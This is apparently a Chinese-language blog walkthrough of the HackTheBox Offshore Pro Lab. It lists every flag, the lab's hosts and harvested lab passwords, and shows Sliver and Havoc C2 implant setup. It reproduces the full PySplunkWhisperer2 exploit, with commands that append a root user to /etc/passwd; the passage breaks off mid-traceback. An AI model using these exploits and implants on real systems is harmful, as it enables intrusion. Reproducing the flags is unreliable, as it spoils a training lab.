---
title: HTB-Offshore
description: 'Pro Labs-Offshore'
pubDate: 2026-03-10
image: /Pro-Labs/offshore.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
---

![](/image/prolabs/Offshore-1.png)

# Flag
```c
OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}
OFFSHORE{fun_w1th_m@g1k_bl0ck$}
OFFSHORE{st0p_tai1ing_m3_br0}
OFFSHORE{l0v3_cl3artext_pr0toc0l$}
OFFSHORE{RC3_a$_@_s3rv1c3}
OFFSHORE{p@ssw0rds_1n_cl3ar_t3xT}
OFFSHORE{4t_y0ur_5erv1ce}   
OFFSHORE{mimikatz_d03s_th3_j0b}
OFFSHORE{cm0n!_an0th3r_sqli!?}
OFFSHORE{sl0ppy_scr1pting_hurt$}
OFFSHORE{hmm_p0tato3s}
OFFSHORE{f1l3_s3rv3rs_h0ld_ju1cy_d@ta}
OFFSHORE{st0p_us1ng_fr33warez!} 
OFFSHORE{An0N_FtP_c@n_rev3al_tr3asUre$} 
OFFSHORE{st0p_us1ng_fr33warez!}
OFFSHORE{r3pl1cation_@ll0w_l1st}
OFFSHORE{ACL_@bus3_0ft3n_ov3rl00k3d}
OFFSHORE{l@zy_adm1ns_ru1n_th3_p4rty}
OFFSHORE{d0nt_s@ve_p@ssw0rds_1n_br0ws3rs!}
OFFSHORE{w@tch_th0s3_3xtra_$ids}
OFFSHORE{c@r3ful_who_y0u_d3legate_t0}
OFFSHORE{h1dd3n_1n_pl@iN_$1ght}
OFFSHORE{3ncrypt10n_w0rk$_w0nd3rs}
OFFSHORE{z3r0_log0n_b3_c@reful!}
OFFSHORE{rc3_fun_w1th_gziP!}
OFFSHORE{z3r0_log0n_n0_pw_r3set!}
OFFSHORE{l0ng_liv3_Th3_t@ter!}
OFFSHORE{s3tuid_f0r_th3_k1ll_sh0t!}
OFFSHORE{d0nt_tru$t_y0ur_us3rs}
OFFSHORE{d0nt_l3av3_f1l3s_ar0und}
OFFSHORE{sm3lls_so_g00d}
OFFSHORE{d0nt_overl00k_gp0}
OFFSHORE{a$$ert1on_r1fl3!!!}
OFFSHORE{b1ts_pl3ase_yall!}
OFFSHORE{w@tch_th3_for3st_burn}
OFFSHORE{th3_fin@l_h0p}
OFFSHORE{it_@ll_c0m3s_FuLl_c1rcl3}
OFFSHORE{Pr0t3ct_Th05e_5ecr3ts}
OFFSHORE{W@tCH_TH05e_Gr0up$}
```

# 环境描述
## 网络结构
Offshore是HTB最大的ProLab之一，涉及**5个域**和多个网段：

| 域 | DC | IP |
| --- | --- | --- |
| corp.local | DC01 | 172.16.1.5 |
| LAB.OFFSHORE.LOCAL | DC0 | 172.16.1.200 |
| dev.ADMIN.OFFSHORE.COM | DC02 | 172.16.2.6 |
| ADMIN.OFFSHORE.COM | DC03 | 172.16.3.5 |
| CLIENT.OFFSHORE.COM | DC04 | 172.16.4.5 |


## 机器对应表

| IP | 主机名 | 域 | 关键服务 | 获取方式 |
|:--|:--|:--|:--|:--|
| 10.10.110.123 | NIX01 | - | Splunk, PostgreSQL | 入口点 |
| 172.16.1.5 | DC01 | corp.local | AD, DNS, SMB | WriteDACL |
| 172.16.1.15 | SQL01 | corp.local | MSSQL | 凭据登录 |
| 172.16.1.23 | NIX01 | corp.local | Splunk | 入口点 (映射 10.10.110.123) |
| 172.16.1.24 | WEB-WIN01 | corp.local | IIS, MSSQL | SQL注入 |
| 172.16.1.26 | FS01 | corp.local | SMB | 凭据登录 |
| 172.16.1.30 | MS01 | corp.local | OpManager | 流量嗅探 |
| 172.16.1.36 | WSADM | corp.local | RDP | 凭据登录 |
| 172.16.1.101 | WS02 | corp.local | WinRM | 密码喷洒 |
| 172.16.1.200 | DC0 | LAB.OFFSHORE.LOCAL | AD | ZeroLogon |
| 172.16.1.201 | JOE-LPTP | LAB.OFFSHORE.LOCAL | FTP, VNC | 匿名访问 |
| 172.16.1.220 | SRV01 | LAB.OFFSHORE.LOCAL | SMB | ZeroLogon |
| 172.16.2.6 | DC02 | dev.ADMIN.OFFSHORE.COM | AD | RBCD |
| 172.16.2.12 | MGMT01 | dev.ADMIN.OFFSHORE.COM | GLPI | CVE-2020-11060 |
| 172.16.2.102 | WS03 | dev.ADMIN.OFFSHORE.COM | SMB | 凭据登录 |
| 172.16.3.5 | DC03 | ADMIN.OFFSHORE.COM | AD | SID注入 |
| 172.16.3.103 | WS04 | ADMIN.OFFSHORE.COM | RDP | 域信任 |
| 172.16.4.5 | DC04 | CLIENT.OFFSHORE.COM | AD | 约束委派 |
| 172.16.4.31 | MS02 | CLIENT.OFFSHORE.COM | SMB | SCF攻击 |
---

# 攻击路径
```c
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Offshore ProLab 攻击路径                           │
└─────────────────────────────────────────────────────────────────────────────┘

[入口点]
    │
    ├─► 10.10.110.123 (NIX01)
    │       │
    │       ├─► Splunk RCE ───────┐
    │       │                      │
    │       ├─► PostgreSQL RCE ────┼──► Root ────► 流量嗅探
    │       │                      │                │
    │       └─► tail提权 ──────────┘                ▼
    │                                          admin:Zaq12wsx!
    │                                                │
    ├─► 172.16.1.30 (MS01/OpManager) ◄───────────────┘
    │       │
    │       ├─► 脚本执行 ───────► SYSTEM
    │       │                       │
    │       └─► logins.xlsx ────────┼──► ned.flanders_adm:Lefthandedyeah!
    │                               │
    ├─► 172.16.1.36 (WSADM) ◄───────┘
    │       │
    │       ├─► RDP登录
    │       │
    │       └─► 服务提权 ───────► SYSTEM ────► wsadmin:Workstationadmin1!
    │                                               │
    ├─► 172.16.1.101 (WS02) ◄───────────────────────┘
    │       │
    │       └─► web.config ─────► svc_iis:Vintage!
    │                               │
    ├─► 172.16.1.24 (WEB-WIN01) ◄───┘
    │       │
    │       ├─► SQL注入 ────────► DBA
    │       │
    │       └─► SOAP注入 ───────► SYSTEM (土豆提权)
    │
    ├─► 172.16.1.26 (FS01)
    │       │
    │       └─► share.bat ──────► bill:"I like to map Shares!"
    │                               │
    │                               └─► backup.ps1 ──► pgibbons:"I l0ve going Fishing!"
    │
    ├─► BloodHound攻击路径
    │       │
    │       ├─► pgibbons ──► salvador (GenericWrite)
    │       │
    │       ├─► salvador ──► cyber_adm (AllExtendedRights)
    │       │
    │       ├─► cyber_adm ──► WEB-WIN01$
    │       │
    │       └─► WEB-WIN01$ ──► DC01 (WriteDACL) ──► DCSync
    │
    ├─► 172.16.1.201 (JOE-LPTP)
    │       │
    │       ├─► FTP匿名 ──────► joe:Dev0ftheyear!
    │       │
    │       └─► VNC ─────────► 7zfm.exe访问PhysicalDrive0
    │
    ├─► 172.16.1.200 (DC0) ──► ZeroLogon ──► DCSync
    │
    ├─► 172.16.2.6 (DC02) ───► RBCD (joe) ──► 域管
    │
    ├─► 172.16.3.5 (DC03) ───► SID注入 ─────► 企业管理员
    │
    └─► 172.16.4.5 (DC04) ───► 约束委派 ────► 域管
```

# C2构建
## sliver
### 服务构建
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# sliver-server                              

Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.

Unpacking assets ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗       
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗      
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝      
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗      
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║      
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝      
                                                      
All hackers gain ninjitsu
[*] Server v1.5.42 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver >
```

### shell生成
```c
[server] sliver > generate --mtls 10.10.16.30  --save ./shell.exe --os Windows
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 38s
[*] Implant saved to /home/kali/Desktop/htb/offshore/shell.exe
[server] sliver >
```

## Havoc-C2
不建议使用kali直装，因为我在生成shell时遇到了无可避免的报错导致没法进行后续利用

[Havoc C2 Framework 初步使用教程 - 喵喵喵✨](https://www.trtyr.top/posts/havoc-c2-framework-preliminary-usage-tutorial/)

### 配置连接
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# havoc server --default
              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \      
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/      
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │            
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │            
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │            
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\      
    │/     \││/     \│   \_/   (_______)(_______/      

         pwn and elevate until it's done

[INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
[INFO] Use default profile
[INFO] Build: 
 - Compiler x64 : /usr/bin/x86_64-w64-mingw32-gcc
 - Compiler x86 : /usr/bin/i686-w64-mingw32-gcc
 - Nasm         : /usr/bin/nasm
[INFO] Time: 11/02/2026 13:15:25
[INFO] Teamserver logs saved under: /root/.havoc/data/loot/2026.02.11._13:15:25                               
[INFO] Starting Teamserver on wss://0.0.0.0:40056
[INFO] Opens existing database: /root/.havoc/data/teamserver.db 
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# find /usr -name "*.yaotl" 2>/dev/null

/usr/share/havoc/data/havoc.yaotl
/usr/share/havoc/profiles/webhook_example.yaotl
/usr/share/havoc/profiles/http_smb.yaotl
/usr/share/havoc/profiles/havoc.yaotl

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# cat /usr/share/havoc/profiles/havoc.yaotl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "5pider" {
        Password = "password1234"
    }

    user "Neo" {
        Password = "password1234"
    }
}

# this is optional. if you dont use it you can remove it.
Service {
    Endpoint = "service-endpoint"
    Password = "service-password"
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# havoc client
              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \      
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/      
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │            
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │            
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │            
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\      
    │/     \││/     \│   \_/   (_______)(_______/      

         pwn and elevate until it's done

QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
[13:21:09] [info] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
[13:21:09] [info] loaded config file: client/config.toml
```

![](/image/prolabs/Offshore-2.png)

![](/image/prolabs/Offshore-3.png)

### 生成shell
![](/image/prolabs/Offshore-4.png)

![](/image/prolabs/Offshore-5.png)

![](/image/prolabs/Offshore-6.png)

# 入口信息收集
## 前置IP
```c
入口IP: 10.10.110.0/24
攻击机IP:10.10.16.30
```

## nmap扫描
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ nmap -sT -T4 10.10.110.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 21:06 CST
Nmap scan report for 10.10.110.2
Host is up (0.42s latency).
All 1000 scanned ports on 10.10.110.2 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 10.10.110.3
Host is up (0.29s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE
443/tcp open  https

Nmap scan report for 10.10.110.123
Host is up (0.27s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8089/tcp open  unknown

Nmap scan report for 10.10.110.124
Host is up (0.27s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 256 IP addresses (4 hosts up) scanned in 92.94 seconds
```

### 10.10.110.3
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ nmap -sTCV -p443 10.10.110.3      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 21:09 CST
Nmap scan report for 10.10.110.3
Host is up (0.50s latency).                      
                                                 
PORT    STATE SERVICE  VERSION                   
443/tcp open  ssl/http nginx                     
|_http-title: pfSense - Login                    
| ssl-cert: Subject: commonName=pfSense-5ad49c9e3b8b9/organizationName=pfSense webConfigurator Self-Signed Certificate/stateOrProvinceName=State/countryName=US
| Subject Alternative Name: DNS:pfSense-5ad49c9e3b8b9
| Not valid before: 2018-04-16T12:52:46
|_Not valid after:  2023-10-07T12:52:46
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.23 seconds
```

### 10.10.110.123
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ nmap -sTCV -p22,80,8000,8089 10.10.110.123
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 21:10 CST
Nmap scan report for 10.10.110.123
Host is up (0.35s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ed:da:93:ee:2e:2b:7a:02:4d:97:3d:1b:f2:40:ba:f6 (RSA)
|   256 7e:de:fa:0c:9d:4c:6c:01:7c:0a:0c:f1:74:4d:f3:5f (ECDSA)
|_  256 15:ab:fc:b8:a2:fa:f1:57:d7:3f:bc:ab:ad:d0:cc:99 (ED25519)
80/tcp   open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: ACME Bank
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http     Splunkd httpd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.110.123:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
8089/tcp open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2018-02-02T20:26:16
|_Not valid after:  2021-02-01T20:26:16
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-server-header: Splunkd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.02 seconds
```

### 10.10.110.124
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ nmap -sTCV -p80 10.10.110.124
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-04 21:10 CST
Nmap scan report for 10.10.110.124
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Offshore Dev
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.17 seconds
```

## 10.10.110.3
### 443端口
![](/image/prolabs/Offshore-7.png)

# 入口靶机-10.10.110.123（Setp:0）
```c
10.10.110.123就是172.16.1.23
```

# 172.16.1.23(Linux)（Setp:1）
## 80端口
![](/image/prolabs/Offshore-8.png)

### 子域名扫描
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# gobuster dir \
-u http://10.10.110.123 \      
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-t 40

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.110.123
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.110.123/css/]                                 
/fonts                (Status: 301) [Size: 314] [--> http://10.10.110.123/fonts/]                               
/images               (Status: 301) [Size: 315] [--> http://10.10.110.123/images/]                              
/index.html           (Status: 200) [Size: 22567]
/js                   (Status: 301) [Size: 311] [--> http://10.10.110.123/js/]                                  
/robots.txt           (Status: 200) [Size: 575]
/server-status        (Status: 403) [Size: 278]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================

```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ dirsearch -u http://10.10.110.123

  _|. _ _  _  _  _ _|_    v0.4.3                        
 (_||| _) (/_(_|| (_| )                                 
                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET
Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/offshore/reports/http_10.10.110.123/_26-02-04_21-29-39.txt
Target: http://10.10.110.123/

[21:29:39] Starting:                                    
[21:29:52] 301 -  311B  - /js  ->  http://10.10.110.123/js/
[21:30:30] 403 -  278B  - /.ht_wsr.txt
[21:30:31] 403 -  278B  - /.htaccess.bak1
[21:30:31] 403 -  278B  - /.htaccess.sample
[21:30:31] 403 -  278B  - /.htaccess.save
[21:30:31] 403 -  278B  - /.htaccess.orig
[21:30:31] 403 -  278B  - /.htaccess_extra
[21:30:31] 403 -  278B  - /.htaccessBAK
[21:30:32] 403 -  278B  - /.htaccessOLD
[21:30:32] 403 -  278B  - /.htaccess_orig
[21:30:32] 403 -  278B  - /.htaccess_sc
[21:30:32] 403 -  278B  - /.htaccessOLD2
[21:30:32] 403 -  278B  - /.htm
[21:30:32] 403 -  278B  - /.html
[21:30:33] 403 -  278B  - /.htpasswd_test
[21:30:33] 403 -  278B  - /.htpasswds
[21:30:33] 403 -  278B  - /.httr-oauth
[21:30:48] 403 -  278B  - /.php
[21:32:57] 301 -  312B  - /css  ->  http://10.10.110.123/css/
[21:33:15] 301 -  314B  - /fonts  ->  http://10.10.110.123/fonts/
[21:33:26] 301 -  315B  - /images  ->  http://10.10.110.123/images/
[21:33:26] 200 -  574B  - /images/
[21:33:33] 200 -  566B  - /js/
[21:34:25] 200 -  335B  - /robots.txt
[21:34:32] 403 -  278B  - /server-status/
[21:34:32] 403 -  278B  - /server-status

Task Completed   
```

### robots.txt
```c
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#此文件用于阻止雅虎等网站运行的网络爬虫和蜘蛛抓取和索引您网站的某些部分。
# This file will be ignored unless it is at the root of your host:
#通过告诉这些“机器人”不要访问您网站的哪些部分，
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html

User-agent: Twitterbot
Disallow:

User-agent: *

```

## 8089端口
![](/image/prolabs/Offshore-9.png)

```c
由于您使用的是不提供身份验证的免费许可证，远程登录已被禁用。要解决此问题，请切换到仅转发器许可证或产品附带的企业试用许可证。要覆盖此设置并启用未经身份验证的远程管理，请编辑 server.conf 文件中的“allowRemoteLogin”设置。
```

## 8000端口
我们在namp扫描中发现了[http://10.10.110.123:8000/en-US/account/login?return_to=%2Fen-US%2F](http://10.10.110.123:8000/en-US/account/login?return_to=%2Fen-US%2F)  尝试访问

![](/image/prolabs/Offshore-10.png)

## hacktricks
在hacktricks上搜索splunk

[8089 - Pentesting Splunkd - HackTricks](https://book.hacktricks.wiki/zh/network-services-pentesting/8089-splunkd.html?highlight=splunk#rce--privilege-escalation)

![](/image/prolabs/Offshore-11.png)

![](/image/prolabs/Offshore-12.png)

这里先判断是linux还是windows

```c
┌──(kali㉿kali)-[~]
└─$ ping 10.10.110.123
PING 10.10.110.123 (10.10.110.123) 56(84) bytes of data.
64 bytes from 10.10.110.123: icmp_seq=1 ttl=62 time=257 ms
64 bytes from 10.10.110.123: icmp_seq=2 ttl=62 time=258 ms
```

ttl=62代表linux

[Splunk LPE and Persistence - HackTricks](https://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/splunk-lpe-and-persistence.html?highlight=splunk#%E6%BB%A5%E7%94%A8-splunk-%E6%9F%A5%E8%AF%A2)

```c
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done

可用的公共漏洞：

    https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
    https://www.exploit-db.com/exploits/46238
    https://www.exploit-db.com/exploits/46487
```

## [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
[https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)

### Exp
```c
import sys, os, tempfile, shutil
import tarfile
import requests
import socketserver
from http.server import SimpleHTTPRequestHandler
import argparse
import threading

requests.packages.urllib3.disable_warnings(category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

SPLUNK_APP_NAME = '_PWN_APP_'


def create_splunk_bundle(options):
    tmp_path = tempfile.mkdtemp()
    os.mkdir(os.path.join(tmp_path, SPLUNK_APP_NAME))

    bin_dir = os.path.join(tmp_path, SPLUNK_APP_NAME, "bin")
    os.mkdir(bin_dir)
    pwn_file = os.path.join(bin_dir, options.payload_file)
    open(pwn_file, "w").write(options.payload)
    # make the script executable - not 100% certain this makes a difference
    os.chmod(pwn_file, 0o700)

    local_dir = os.path.join(tmp_path, SPLUNK_APP_NAME, "local")
    os.mkdir(local_dir)
    inputs_conf = os.path.join(local_dir, "inputs.conf")
    with open(inputs_conf, "w") as f:
        inputs = '[script://$SPLUNK_HOME/etc/apps/{}/bin/{}]\n'.format(SPLUNK_APP_NAME, options.payload_file)
        inputs += 'disabled = false\n'
        inputs += 'index = default\n'
        inputs += 'interval = 60.0\n'
        inputs += 'sourcetype = test\n'
        f.write(inputs)

    (fd, tmp_bundle) = tempfile.mkstemp(suffix='.tar')
    os.close(fd)
    with tarfile.TarFile(tmp_bundle, mode="w") as tf:
        tf.add(os.path.join(tmp_path, SPLUNK_APP_NAME), arcname=SPLUNK_APP_NAME)

    shutil.rmtree(tmp_path)
    return tmp_bundle


class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        global BUNDLE_FILE
        bundle = open(BUNDLE_FILE, 'rb').read()

        self.send_response(200)
        self.send_header('Expires', 'Thu, 26 Oct 1978 00:00:00 GMT')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Content-type', 'application/tar')
        self.send_header('Content-Disposition', 'attachment; filename="splunk_bundle.tar"')
        self.send_header('Content-Length', len(bundle))
        self.end_headers()

        self.wfile.write(bundle)


class ThreadedHTTPServer(object):
    """Runs SimpleHTTPServer in a thread
    Lets you start and stop an instance of SimpleHTTPServer.
    """

    def __init__(self, host, port, request_handler=SimpleHTTPRequestHandler):
        """Prepare thread and socket server
        Creates the socket server that will use the HTTP request handler. Also
        prepares the thread to run the serve_forever method of the socket
        server as a daemon once it is started
        """
        socketserver.TCPServer.allow_reuse_address = True
        self.server = socketserver.TCPServer((host, int(port)), request_handler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()

    def stop(self):
        """Stop the HTTP server
        Stops the server and cleans up the port assigned to the socket
        """
        self.server.shutdown()
        self.server.server_close()


parser = argparse.ArgumentParser()
parser.add_argument('--scheme', default="https")
parser.add_argument('--host', required=True)
parser.add_argument('--port', default=8089)
parser.add_argument('--lhost', required=True)
parser.add_argument('--lport', default=8181)
parser.add_argument('--username', default="admin")
parser.add_argument('--password', default="changeme")
parser.add_argument('--payload', default="calc.exe")
parser.add_argument('--payload-file', default="pwn.bat")
options = parser.parse_args()

print("Running in remote mode (Remote Code Execution)")

SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )

s = requests.Session()
s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
s.verify = False

print("[.] Authenticating...")
req = s.get(SPLUNK_BASE_API)
if req.status_code == 401:
    print("Authentication failure")
    print("")
    print(req.text)
    sys.exit(-1)
print("[+] Authenticated")

print("[.] Creating malicious app bundle...")
BUNDLE_FILE = create_splunk_bundle(options)
print("[+] Created malicious app bundle in: " + BUNDLE_FILE)

httpd = ThreadedHTTPServer(options.lhost, options.lport, request_handler=CustomHandler)
print("[+] Started HTTP server for remote mode")

lurl = "http://{}:{}/".format(options.lhost, options.lport)

print("[.] Installing app from: " + lurl)
req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
if req.status_code != 200 and req.status_code != 201:
    print("Got a problem: " + str(req.status_code))
    print("")
    print(req.text)
print("[+] App installed, your code should be running now!")

print("\nPress RETURN to cleanup")
input()
os.remove(BUNDLE_FILE)

print("[.] Removing app...")
req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
if req.status_code != 200 and req.status_code != 201:
    print("Got a problem: " + str(req.status_code))
    print("")
    print(req.text)
print("[+] App removed")

httpd.stop()
print("[+] Stopped HTTP server")

print("Bye!")
```

### remote利用(失败)
```c
python PySplunkWhisperer2_remote.py --host 10.10.110.123 --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 10.10.16.30
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# python PySplunkWhisperer2_remote.py --host 10.10.110.123 --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 10.10.16.30     
Running in remote mode (Remote Code Execution)
[.] Authenticating...
Authentication failure

<?xml version="1.0" encoding="UTF-8"?>
<response>
  <messages>
    <msg type="WARN">Remote login disabled because you are using a free license which does not provide authentication. To resolve either switch to the forwarder-only license or the enterprise trial license included with the product. To override this and enable unauthenticated remote management, edit the 'allowRemoteLogin' setting in your server.conf file.</msg>
  </messages>
</response>
```

```c
python PySplunkWhisperer2_remote.py --host 10.10.110.123 --port 8000 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 10.10.16.30
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# python PySplunkWhisperer2_remote.py --host 10.10.110.123 --port 8000 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 10.10.16.30
Running in remote mode (Remote Code Execution)
[.] Authenticating...
Traceback (most recent call last):
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/connectionpool.py", line 464, in _make_request
    self._validate_conn(conn)
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/connectionpool.py", line 1093, in _validate_conn
    conn.connect()
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/connection.py", line 796, in connect
    sock_and_verified = _ssl_wrap_socket_and_match_hostname(
                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/connection.py", line 975, in _ssl_wrap_socket_and_match_hostname
    ssl_sock = ssl_wrap_socket(
               ^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/util/ssl_.py", line 483, in ssl_wrap_socket
    ssl_sock = _ssl_wrap_socket_impl(sock, context, tls_in_tls, server_hostname)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/util/ssl_.py", line 527, in _ssl_wrap_socket_impl
    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/3.11.9/lib/python3.11/ssl.py", line 517, in wrap_socket
    return self.sslsocket_class._create(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/3.11.9/lib/python3.11/ssl.py", line 1104, in _create
    self.do_handshake()
  File "/root/.pyenv/versions/3.11.9/lib/python3.11/ssl.py", line 1382, in do_handshake
    self._sslobj.do_handshake()
